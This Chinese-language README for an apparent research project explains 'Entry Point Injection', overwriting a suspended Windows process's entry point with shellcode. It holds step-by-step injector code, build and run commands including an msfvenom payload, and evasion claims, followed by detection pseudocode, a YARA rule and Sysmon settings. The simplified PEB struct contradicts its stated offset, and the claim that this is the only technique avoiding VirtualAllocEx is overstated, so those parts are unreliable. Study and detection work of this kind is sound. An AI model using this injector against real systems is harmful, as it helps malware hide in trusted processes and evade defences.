# Entry Point Injection - 入口点注入技术

## 📋 技术概述

**Entry Point Injection** 是一种巧妙的进程注入技术，它通过直接修改目标进程的入口点（Entry Point）代码来执行 shellcode，**无需使用 VirtualAllocEx 分配新内存**。

### 核心思想
1. **创建挂起进程**：使用 `CREATE_SUSPENDED` 创建目标进程
2. **定位入口点**：通过 PEB → ImageBase → PE 头 → AddressOfEntryPoint
3. **直接覆盖**：将 shellcode 写入入口点地址
4. **自然执行**：恢复线程，进程从 shellcode 开始运行

**关键优势**：避免分配可疑的 RWX 内存，shellcode 位于进程自己的代码段。

---

## 🔬 技术原理

### 1. 为什么不需要 VirtualAllocEx？

传统注入流程 vs Entry Point Injection：

```
传统注入流程：
[创建进程]
    |
[VirtualAllocEx]  ← 分配新内存（可疑！）
    |
[WriteProcessMemory] ← 写入 shellcode
    |
[CreateRemoteThread] ← 创建远程线程

Entry Point Injection：
[创建挂起进程]
    |
[读取 PEB + PE 头] ← 获取入口点地址
    |
[WriteProcessMemory] ← 直接写入入口点
    |
[ResumeThread]      ← 进程从 shellcode 开始运行
```

**关键洞察**：
- 进程的入口点（Entry Point）已经是可执行的内存
- 进程启动时必然会跳转到入口点执行
- 我们只需覆盖入口点代码为 shellcode
- 无需分配新内存，无需创建远程线程

### 2. PE 结构与入口点

PE 文件结构：

```
+------------------+
| DOS Header       |  ← e_magic = "MZ"
| e_lfanew --------|-----+
+------------------+     |
| DOS Stub         |     |
+------------------+     |
| NT Headers       | <---+
|   Signature      |  ← "PE\0\0"
|   FileHeader     |
|   OptionalHeader |
|     AddressOfEntryPoint ← 入口点 RVA ★
|     ImageBase    |
|     ...          |
+------------------+
| Section Headers  |
+------------------+
| .text Section    |  ← 代码段
+------------------+
| .data Section    |
+------------------+
| ...              |
+------------------+
```

**计算入口点绝对地址**：
```c
EntryPoint = ImageBase + AddressOfEntryPoint
```

### 3. 完整技术流程

```c
// ========== 步骤 1：创建挂起的目标进程 ==========
PROCESS_INFORMATION pi = {0};
CreateProcessA(
    NULL,
    "C:\\Windows\\System32\\notepad.exe",
    NULL, NULL, FALSE,
    CREATE_SUSPENDED,  // 挂起模式 ★
    NULL, NULL, &si, &pi
);
// 此时进程已创建，但主线程尚未开始执行

// ========== 步骤 2：查询进程基础信息 ==========
PROCESS_BASIC_INFORMATION pbi = {0};
NtQueryInformationProcess(
    pi.hProcess,
    ProcessBasicInformation,
    &pbi,
    sizeof(pbi),
    &returnLength
);
// 获得 PEB 地址

// ========== 步骤 3：从 PEB 读取 ImageBase ==========
// PEB 结构偏移 0x10 位置存储 ImageBaseAddress
PVOID pebImageBaseOffset = (PVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x10);

PVOID imageBase = NULL;
ReadProcessMemory(
    pi.hProcess,
    pebImageBaseOffset,
    &imageBase,
    sizeof(imageBase),
    &bytesRead
);
// 获得进程镜像基址（ImageBase）

// ========== 步骤 4：读取 PE 头部 ==========
BYTE headersBuffer[4096] = {0};
ReadProcessMemory(
    pi.hProcess,
    imageBase,
    headersBuffer,
    sizeof(headersBuffer),
    &bytesRead
);
// 读取 PE 头到本地缓冲区

// ========== 步骤 5：解析入口点 RVA ==========
// DOS 头
PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;

// NT 头
PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)(headersBuffer + dosHeader->e_lfanew);

// 入口点 RVA
DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;

// 计算入口点绝对地址
PVOID entryPoint = (PVOID)((ULONG_PTR)imageBase + entryPointRVA);

// ========== 步骤 6：修改入口点保护为可写 ==========
PVOID baseAddress = entryPoint;
SIZE_T regionSize = shellcodeSize;
ULONG oldProtect = 0;

NtProtectVirtualMemory(
    pi.hProcess,
    &baseAddress,
    &regionSize,
    PAGE_READWRITE,
    &oldProtect
);

// ========== 步骤 7：写入 shellcode 到入口点 ==========
NtWriteVirtualMemory(
    pi.hProcess,
    entryPoint,
    shellcode,
    shellcodeSize,
    &bytesWritten
);

// ========== 步骤 8：恢复原始保护 ==========
NtProtectVirtualMemory(
    pi.hProcess,
    &baseAddress,
    &regionSize,
    oldProtect,
    &dummy
);

// ========== 步骤 9：恢复线程执行 ==========
ResumeThread(pi.hThread);

// 此时主线程开始运行，直接跳转到入口点执行 shellcode！
```

---

## 🆚 与其他技术的对比

### Entry Point Injection vs Process Hollowing

| 特性 | Process Hollowing | Entry Point Injection |
|-----|------------------|----------------------|
| **内存分配** | VirtualAllocEx（新内存） | 无需分配（使用现有代码段） |
| **PE 操作** | NtUnmapViewOfSection（卸载镜像） | 仅修改入口点 |
| **复杂度** | 高（需重映射整个 PE） | 低（仅覆盖几百字节） |
| **载荷类型** | 完整 PE 文件 | Shellcode |
| **Shellcode 大小限制** | 无 | 有（取决于入口点后代码大小） |
| **隐蔽性** | 中 | 高（无新内存分配） |

### Entry Point Injection vs 传统 DLL 注入

| 特性 | DLL Injection | Entry Point Injection |
|-----|--------------|----------------------|
| **VirtualAllocEx** | 需要 | 不需要 ★ |
| **CreateRemoteThread** | 需要 | 不需要 ★ |
| **文件落地** | 是（DLL 文件） | 否（Shellcode） |
| **检测难度** | 低（枚举模块） | 高（无新内存） |
| **实现难度** | 低 | 中 |

### Entry Point Injection vs Early Bird APC

| 特性 | Early Bird APC | Entry Point Injection |
|-----|---------------|----------------------|
| **注入机制** | APC 队列 | 直接覆盖入口点 |
| **VirtualAllocEx** | 需要 | 不需要 ★ |
| **创建标志** | DEBUG_PROCESS | CREATE_SUSPENDED |
| **执行时机** | 主线程初始化时 | 主线程启动时 |
| **复杂度** | 中 | 低 |

**关键优势**：Entry Point Injection 是唯一不需要 VirtualAllocEx 的注入技术！

---

## 🛠️ 实现步骤

### 核心函数调用链

```
main()
  └─> ReadShellcodeFile()           // 读取 shellcode
  └─> CreateSuspendedProcess()      // 创建挂起进程
        └─> CreateProcessA()        // CREATE_SUSPENDED 标志 ★
  └─> NtQueryInformationProcess()   // 查询进程信息
        └─> 获取 PEB 地址
  └─> GetEntryPoint()               // 获取入口点地址 ★
        ├─> ReadProcessMemory()     // 从 PEB 读取 ImageBase
        ├─> ReadProcessMemory()     // 读取 PE 头
        └─> 解析 AddressOfEntryPoint
  └─> InjectShellcodeToEntryPoint() // 注入 shellcode ★
        ├─> NtProtectVirtualMemory() // 修改为可写
        ├─> NtWriteVirtualMemory()   // 写入 shellcode
        └─> NtProtectVirtualMemory() // 恢复保护
  └─> ResumeThread()                // 恢复线程执行 ★
```

### 关键 API 说明

#### 1. NtQueryInformationProcess - 查询进程信息
```c
NTSTATUS status = NtQueryInformationProcess(
    hProcess,                   // 进程句柄
    ProcessBasicInformation,    // 信息类型 ★
    &pbi,                       // 返回 PROCESS_BASIC_INFORMATION
    sizeof(pbi),
    &returnLength
);

// PROCESS_BASIC_INFORMATION 结构包含：
// - PebBaseAddress：PEB 地址 ★
// - UniqueProcessId：进程 PID
// - InheritedFromUniqueProcessId：父进程 PID
```

#### 2. PEB 结构（简化）
```c
// PEB 位于进程地址空间中
typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;
    PVOID ProcessParameters;
    PVOID Reserved4[3];
    PVOID AtlThunkSListPtr;
    PVOID Reserved5;
    ULONG Reserved6;
    PVOID Reserved7;
    ULONG Reserved8;
    ULONG AtlThunkSListPtr32;
    // ...
    PVOID ImageBaseAddress;  // +0x10 偏移 ★
} PEB, *PPEB;
```

#### 3. ReadProcessMemory - 读取远程进程内存
```c
BOOL success = ReadProcessMemory(
    hProcess,           // 进程句柄
    lpBaseAddress,      // 读取地址
    lpBuffer,           // 本地缓冲区
    nSize,              // 读取大小
    lpNumberOfBytesRead // 实际读取字节数
);
```

#### 4. NtWriteVirtualMemory - 写入远程进程内存
```c
NTSTATUS status = NtWriteVirtualMemory(
    hProcess,               // 进程句柄
    BaseAddress,            // 写入地址（入口点）★
    Buffer,                 // 数据（shellcode）★
    NumberOfBytesToWrite,   // 写入大小
    NumberOfBytesWritten    // 实际写入字节数
);
```

---

## 🔍 检测方法

### 1. 行为特征检测

Entry Point Injection 的可疑行为序列：

```python
suspicious_sequence = [
    "CreateProcessA(..., CREATE_SUSPENDED)",    # 创建挂起进程
    "NtQueryInformationProcess(...)",           # 查询进程信息
    "ReadProcessMemory(...)",                   # 读取 PEB/PE 头
    "NtProtectVirtualMemory(..., PAGE_READWRITE)", # 修改入口点保护
    "NtWriteVirtualMemory(..., EntryPoint, ...)",  # 写入入口点
    "ResumeThread(...)"                         # 恢复线程
]
```

### 2. 内存扫描

检测入口点是否被修改：

```c
// 伪代码
void DetectEntryPointModification(HANDLE hProcess) {
    // 1. 获取进程 ImageBase 和 EntryPoint
    PVOID imageBase = GetImageBase(hProcess);
    PVOID entryPoint = GetEntryPointAddress(hProcess, imageBase);

    // 2. 从磁盘读取原始 PE 文件
    BYTE originalBytes[256];
    ReadOriginalEntryPoint(GetProcessPath(hProcess), originalBytes, 256);

    // 3. 从内存读取当前入口点
    BYTE currentBytes[256];
    ReadProcessMemory(hProcess, entryPoint, currentBytes, 256, NULL);

    // 4. 比对差异
    if (memcmp(originalBytes, currentBytes, 256) != 0) {
        Alert("Entry point modified! Possible injection detected!");
    }
}
```

### 3. EDR 检测规则

| 检测点 | 描述 | 风险等级 |
|-------|------|---------|
| **挂起进程创建** | CREATE_SUSPENDED 标志 | 中 |
| **PEB 访问** | 读取 PEB + 0x10（ImageBase） | 中 |
| **入口点修改** | 修改入口点内存保护 + 写入 | 高 |
| **组合行为** | 上述3个行为短时间内连续发生 | **非常高** |

### 4. Yara 规则

```yara
rule Entry_Point_Injection {
    meta:
        description = "Detects Entry Point Injection in memory"
        author = "Security Researcher"

    strings:
        // 常见 shellcode 特征
        $shellcode1 = { FC 48 83 E4 F0 E8 }  // 常见 x64 shellcode 前导
        $shellcode2 = { 31 C0 50 68 63 61 6C 63 }  // calc.exe shellcode

        // API 调用特征
        $api1 = "NtQueryInformationProcess" ascii
        $api2 = "NtWriteVirtualMemory" ascii
        $api3 = "NtProtectVirtualMemory" ascii

    condition:
        // 在入口点附近检测到 shellcode
        any of ($shellcode*) at entry_point or
        // 或检测到特定 API 组合
        all of ($api*)
}
```

### 5. 内核驱动检测

```c
// 在进程创建回调中检测
VOID ProcessNotifyCallback(
    HANDLE ParentId,
    HANDLE ProcessId,
    BOOLEAN Create
) {
    if (Create) {
        // 检查进程是否以挂起模式创建
        if (IsProcessSuspended(ProcessId)) {
            // 设置内存访问回调，监控入口点修改
            MonitorEntryPointAccess(ProcessId);
        }
    }
}

// 内存访问回调
VOID MemoryAccessCallback(
    HANDLE ProcessId,
    PVOID Address,
    SIZE_T Size,
    ULONG Protection
) {
    PVOID entryPoint = GetProcessEntryPoint(ProcessId);

    // 检查是否修改入口点区域
    if (Address == entryPoint && Protection & PAGE_READWRITE) {
        Alert("Entry Point memory protection changed!");
    }
}
```

---

## 📦 编译和运行

### Windows (MSYS2/MinGW)

```bash
# 运行构建脚本
./build.bat

# 或手动编译
mkdir -p build/x64

# 1. 编译 shellcode 生成器
gcc -o build/x64/generate_shellcode.exe src/generate_shellcode.c -O2 -s

# 2. 生成 shellcode
build/x64/generate_shellcode.exe build/x64/payload.bin

# 3. 编译主程序
gcc -o build/x64/entry_point_injection.exe src/entry_point_injection.c -lntdll -O2 -s

# 4. 编译测试载荷（可选）
gcc -o build/x64/test_payload.exe src/test_payload.c -luser32 -mwindows -O2 -s
```

### Linux (交叉编译)

```bash
# 运行构建脚本
./build.sh

# 或使用 CMake
mkdir build && cd build
cmake ..
make
```

### 运行示例

```bash
# 管理员权限运行（注入到 notepad.exe）
build/x64/entry_point_injection.exe C:\Windows\System32\notepad.exe build/x64/payload.bin

# 注入到 calc.exe
build/x64/entry_point_injection.exe C:\Windows\System32\calc.exe build/x64/payload.bin

# 使用自定义 shellcode
# 1. 生成自定义 shellcode（例如使用 msfvenom）
msfvenom -p windows/x64/messagebox TEXT="Pwned!" -f raw -o custom.bin

# 2. 注入自定义 shellcode
build/x64/entry_point_injection.exe C:\Windows\System32\cmd.exe custom.bin
```

**预期输出**：
```
======================================
  Entry Point Injection 技术
======================================

[1] 读取 shellcode 文件
    文件：build/x64/payload.bin
    大小：317 字节
    ✓ Shellcode 读取成功

[2] 创建挂起的目标进程
    目标：C:\Windows\System32\notepad.exe
    进程 PID：1234
    线程 TID：5678
    ✓ 进程已创建（挂起状态）

[3] 查询进程基础信息
    PEB 地址：0x00000000ABCD0000
    ✓ 进程信息查询成功

[4] 获取进程入口点地址
    ImageBase：0x00007FF700000000
    AddressOfEntryPoint (RVA)：0x1A2B
    入口点地址：0x00007FF700001A2B
    ✓ 入口点定位成功

[5] 将 shellcode 写入入口点
    原始保护：0x20
    写入字节：317 / 317
    ✓ Shellcode 注入成功

[6] 恢复主线程执行
    ✓ 线程已恢复，进程从入口点 shellcode 开始执行

======================================
✓ Entry Point Injection 完成
进程 PID：1234
入口点：0x00007FF700001A2B
======================================
```

此时，notepad.exe 进程启动，但执行的是 shellcode（弹出消息框）。

---

## 📂 目录结构

```
07-entry-point-injection/
├── README.md                      # 本文档
├── build.sh                       # Linux 构建脚本
├── build.bat                      # Windows 构建脚本
├── CMakeLists.txt                 # CMake 配置
├── src/
│   ├── entry_point_injection.c    # 主程序实现 (~430 行)
│   ├── generate_shellcode.c       # Shellcode 生成器
│   └── test_payload.c             # 测试载荷程序
└── build/
    └── x64/
        ├── entry_point_injection.exe
        ├── generate_shellcode.exe
        ├── payload.bin
        └── test_payload.exe
```

---

## 🎯 技术要点

### 1. Shellcode 大小限制

Entry Point Injection 的最大限制是 **shellcode 大小**：

```c
// 入口点后面可能有其他代码
[Entry Point]
[Shellcode 覆盖区域]  ← 最大几百字节到几 KB
[其他函数代码]        ← 不能覆盖

// 解决方案：
// 1. 使用小型 shellcode（< 1KB）
// 2. Shellcode 执行后调用 ExitProcess
// 3. 或使用 stager（第一阶段加载第二阶段）
```

### 2. PEB 偏移的稳定性

PEB 结构的 ImageBaseAddress 偏移：
- **x64**：`+0x10`
- **x86**：`+0x08`

```c
#ifdef _WIN64
    PVOID pebImageBaseOffset = (PVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x10);
#else
    PVOID pebImageBaseOffset = (PVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x08);
#endif
```

### 3. 为什么不用 WriteProcessMemory？

```c
// 两者功能相同
WriteProcessMemory(hProcess, addr, buf, size, &written);
NtWriteVirtualMemory(hProcess, addr, buf, size, &written);

// 但 NtWriteVirtualMemory 更底层：
// - 绕过某些用户态 hook
// - 与 NtProtectVirtualMemory 配对使用更一致
```

### 4. 入口点代码示例

典型的 PE 入口点代码：

```asm
; 原始入口点代码（notepad.exe）
push    rbp
mov     rbp, rsp
sub     rsp, 20h
call    __security_init_cookie
...

; 被 shellcode 覆盖后：
mov     r10, rcx       ; shellcode 前导
push    r10
push    r10
...
```

---

## 🛡️ 防御建议

### 对于安全产品

1. **监控挂起进程创建**
   - 检测 `CREATE_SUSPENDED` 标志
   - 记录后续的内存操作

2. **入口点完整性检查**
   - 在进程启动时验证入口点代码
   - 与磁盘上的 PE 文件对比
   - 检测异常的字节序列（shellcode 特征）

3. **内存访问监控**
   - Hook `NtProtectVirtualMemory` 和 `NtWriteVirtualMemory`
   - 检测对入口点区域的写操作
   - 验证写入的数据是否为合法代码

4. **行为分析**
   - 建立正常进程启动的基线
   - 检测异常的 API 调用序列
   - 关联进程创建和内存修改事件

### 对于系统管理员

1. **启用高级审计**
   ```powershell
   # 启用进程创建审计
   auditpol /set /subcategory:"Process Creation" /success:enable

   # 启用线程操作审计
   auditpol /set /subcategory:"Thread Manipulation" /success:enable
   ```

2. **部署 Sysmon**
   ```xml
   <RuleGroup groupRelation="or">
     <!-- 检测挂起进程创建 -->
     <ProcessCreate onmatch="include">
       <ParentImage condition="end with">suspicious.exe</ParentImage>
     </ProcessCreate>

     <!-- 检测内存操作 -->
     <ProcessAccess onmatch="include">
       <GrantedAccess condition="is">0x1F0FFF</GrantedAccess>
     </ProcessAccess>
   </RuleGroup>
   ```

3. **应用白名单**
   - 限制哪些进程可以创建挂起进程
   - 禁止非授权程序进行跨进程内存操作

---

## 📚 参考资料

1. **原始研究**
   - [ired.team: AddressOfEntryPoint Injection](https://www.ired.team/offensive-security/code-injection-process-injection/addressofentrypoint-code-injection-without-virtualallocex-rwx)
   - [timwhitez/AddressOfEntryPoint-injection](https://github.com/timwhitez/AddressOfEntryPoint-injection)

2. **PE 格式文档**
   - [Microsoft PE and COFF Specification](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)
   - [PE Format - Corkami](https://github.com/corkami/pics/tree/master/binary/pe101)

3. **PEB 结构**
   - [PEB Structure (MSDN)](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)
   - [Undocumented Structures - Geoffrey Chappell](https://www.geoffchappell.com/studies/windows/win32/ntdll/structs/peb/index.htm)

4. **NT API**
   - [NtQueryInformationProcess](https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess)
   - [NtWriteVirtualMemory](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtWriteVirtualMemory.html)

5. **相关技术研究**
   - Process Hollowing
   - Module Stomping
   - Thread Execution Hijacking

---

## ⚖️ 免责声明

本项目仅用于**安全研究和教育目的**。Entry Point Injection 是一项合法的 Windows 进程注入技术，但可能被恶意软件用于规避检测。

- ✅ **合法用途**：安全研究、EDR 测试、红队演练
- ❌ **禁止用途**：未授权的系统访问、恶意软件开发

使用者需遵守当地法律法规，仅在授权环境中使用本技术。

---

## 📝 实现说明

- **语言**：纯 C 实现（C11 标准）
- **编译器**：GCC (MinGW-w64) / MSVC
- **测试环境**：Windows 10 21H2 (x64)
- **代码风格**：详细中文注释，易于理解
- **依赖库**：ntdll.lib

---

**作者**：基于 timwhitez 和 ired.team 的研究实现
**日期**：2025年
**版本**：1.0
